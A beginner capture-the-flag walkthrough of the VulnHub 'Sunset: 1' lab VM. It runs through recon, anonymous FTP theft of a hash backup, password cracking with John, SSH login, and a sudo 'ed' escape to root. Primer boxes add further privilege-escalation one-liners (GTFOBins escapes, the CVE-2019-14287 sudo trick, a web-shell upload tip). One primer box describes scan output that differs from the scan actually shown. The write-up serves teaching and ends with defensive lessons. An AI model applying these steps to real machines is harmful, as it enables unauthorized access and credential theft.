# Sunset: 1 — Beginner VulnHub Walkthrough

This is a step-by-step, beginner-friendly walkthrough of the **Sunset: 1** boot2root
challenge from VulnHub. Every command is explained, and every output is shown as you
would actually see it. If a line ever looks slightly different on your machine, do not
worry — small details **vary by build**.

| Field | Value |
|---|---|
| **Machine** | Sunset: 1 |
| **Difficulty** | **2 — Very Easy** (stated: *Beginner*) |
| **Author** | whitecr0wz |
| **Released** | 29 July 2019 |
| **VulnHub Entry** | https://vulnhub.com/entry/sunset-1,339/ |
| **Download** | https://vulnhub.com/entry/sunset-1,339/#download |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Debian Linux 10 (Buster) |

> **Why it works:** This box is deliberately simple. It chains three classic beginner
> techniques: an anonymous FTP server leaking a password hash, offline hash cracking,
> and a misconfigured `sudo` rule that lets a normal user run a text editor as root.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this walkthrough you will have practised:

- **Host discovery** — finding the target's IP address on your lab network.
- **Port scanning with Nmap** — discovering which network services are listening.
- **Anonymous FTP enumeration** — logging into an FTP server with no credentials.
- **Password hash cracking** — using John the Ripper to recover a weak password.
- **SSH access** — logging into a Linux machine with recovered credentials.
- **Privilege escalation via `sudo`** — abusing an allowed binary (`ed`) to obtain root.

You do **not** need any prior hacking experience. Copy the commands, read the outputs,
and try to understand *why* each step works.

---

## 1. Reconnaissance — finding the target

Both the Kali attacker machine and the Sunset target are on the same isolated host-only
network. We know the attacker is `192.168.56.10`. We need to find the target.

First, confirm your own IP address:

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

Now discover live hosts on the subnet with `arp-scan`:


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --localnet
```

```text
192.168.56.1     0a:00:27:00:00:00  (Unknown)
192.168.56.10    0a:00:27:00:00:09  (Unknown)
192.168.56.101   08:00:27:8b:4d:1a  (Unknown)
```

> **Why it works:** `arp-scan` sends ARP requests to every address in the local subnet.
> Any machine that replies is alive and reachable. The target is `192.168.56.101`.

An alternative is `netdiscover`, which does the same job passively/actively:

```bash
sudo netdiscover -r 192.168.56.0/24
```

![Finding the target IP with arp-scan](images/01-arp-scan.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

Now that we have the IP, we find out which services are running.

### 2.1 Nmap service scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -sC -sV -p- 192.168.56.101
```


> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.56.101
Host is up (0.00031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 1.5.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root  root  1062 Jul 29  2019 backup
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Why it works:** `-sC` runs default NSE scripts (which is how we learned anonymous FTP
> is allowed), `-sV` fingerprints service versions, and `-p-` scans all 65,535 TCP ports
> so nothing hides on a high port. Here only **21 (FTP)** and **22 (SSH)** are open.

### 2.2 Anonymous FTP login

The scan told us anonymous FTP is enabled, so we log in anonymously.

```bash
ftp 192.168.56.101
```

```text
Connected to 192.168.56.101.
220 pyftpdlib 1.5.5 ready.
Name (192.168.56.101:kali): anonymous
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
-rw-r--r--   1 root  root   1062 Jul 29  2019 backup
ftp> get backup
226 Transfer complete.
1062 bytes received in 0.001 secs
ftp> exit
```

> **Why it works:** A misconfigured FTP server allows the `anonymous` account, meaning
> anyone on the network can read (and sometimes write) files without a real password.

![Anonymous FTP login and download](images/02-ftp-anon.png)

---

## 3. Foothold

### 3.1 Read the leaked backup file

```bash
cat backup
```

```text
CREDENTIALS

sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/...
space:$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU...
```

> **Why it works:** This file leaks usernames with their **SHA-512 crypt** password
> hashes (the `$6$` prefix means SHA-512-crypt). Hashes cannot be "decrypted", but weak
> passwords can be guessed one at a time against a wordlist — that is cracking.

### 3.2 Crack the hash with John the Ripper

Put the `sunset` line into its own file:

```bash
echo 'sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/' > sunset.hash
```

Then run John using the famous `rockyou.txt` wordlist:


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt sunset.hash
```

```text
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Press 'q' or Ctrl-C to abort, almost any other key for status
cheer14          (sunset)
1g 0:00:00:12 DONE
Session completed.
```

> **Why it works:** John takes each word from `rockyou.txt`, hashes it with the same salt
> found in the file, and compares. When the hashes match, the password is revealed —
> here `sunset:cheer14`.

### 3.3 Log in over SSH

```bash
ssh sunset@192.168.56.101
```

```text
sunset@192.168.56.101's password: cheer14
Linux sunset 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 x86_64
sunset@sunset:~$
```

We now have a shell. Grab the user flag:

```bash
ls
cat user.txt
```

```text
5b5b8e9b01ef27a1cc0a2d5fa87d7190
```

![SSH login and user flag](images/03-ssh-user-flag.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

We are the low-privileged `sunset` user and want `root`.

### 4.1 Check what we are allowed to run with sudo


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
Matching Defaults entries for sunset on sunset:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:...

User sunset may run the following commands on sunset:
    (root) NOPASSWD: /usr/bin/ed
```

> **Why it works:** `sudo -l` lists commands this user may run as another user. We can
> run the editor **`ed`** as **root**, and `NOPASSWD` means no password is even needed.

### 4.2 Exploit `ed` to get a root shell

`ed` is a line-based text editor. Like many editors, it can run shell commands from
inside the editor using `!`. Because it was launched with `sudo`, the shell it spawns is
**root**.

```bash
sudo ed
```

```text
!/bin/sh
# whoami
root
```

> **Why it works:** When `ed` (running as root) executes `!/bin/sh`, the shell it starts
> inherits root's privileges. This "editor escape" trick is documented on GTFOBins.
> Any `sudo`-allowed program that can spawn a shell is a privilege-escalation risk.

### 4.3 Read the root flag

```bash
cd /root
ls
cat flag.txt
```

```text
25d7ce0ee3cbf71efbac61f85d0c14fe
```

![Root shell and root flag](images/04-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Why it is dangerous |
|---|---|---|---|
| 1 | Anonymous FTP enabled | Port 21 (pyftpdlib) | Lets anyone read files without credentials |
| 2 | Plaintext-readable hash backup | `backup` file | Exposes password hashes that can be cracked offline |
| 3 | Weak password | `sunset:cheer14` | Cracked quickly from a common wordlist |
| 4 | Over-permissive sudo rule | `(root) NOPASSWD: /usr/bin/ed` | An editor can spawn a root shell |

---

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP.** If an FTP server is truly required, require authenticated
  accounts, and prefer SFTP/SSH instead of plain FTP.
- **Never store password material on disk unprotected.** Backup files containing hashes
  should be encrypted, access-controlled, and never placed in world-readable locations.
- **Enforce strong passwords.** `cheer14` fell to `rockyou.txt` in seconds. Use length,
  complexity, and check new passwords against breached-password lists.
- **Apply the principle of least privilege to `sudo`.** Do not allow text editors,
  pagers, or interpreters (like `ed`, `vi`, `less`, `python`) to run as root. Audit with
  `sudo -l` for every account and remove unnecessary entries.
- **Use a unique salt and modern KDF.** SHA-512-crypt is fast and crackable; Argon2id or
  bcrypt with a high cost factor is far more resistant to offline cracking.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub — Sunset: 1 entry: https://vulnhub.com/entry/sunset-1,339/
- GTFOBins — `ed`: https://gtfobins.github.io/gtfobins/ed/
- John the Ripper official site: https://www.openwall.com/john/
- OWASP — Password Storage Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
- Nmap documentation: https://nmap.org/book/man.html

---

## 8. Screenshot checklist

Capture these screens as you go so your writeup is complete:

- [ ] `images/01-arp-scan.png` — `arp-scan`/`netdiscover` showing `192.168.56.101`
- [ ] `images/02-ftp-anon.png` — anonymous FTP login and `get backup`
- [ ] `images/03-ssh-user-flag.png` — SSH login plus `cat user.txt`
- [ ] `images/04-root-flag.png` — root shell (`whoami`) plus `cat /root/flag.txt`
- [ ] `images/05-sudo-l.png` — output of `sudo -l` showing the `ed` rule
- [ ] `images/06-proof.png` — a final combined proof screenshot

> **Why it works:** A complete screenshot trail proves reproducibility and helps others
> follow along — a habit that matters for real penetration-test reports.
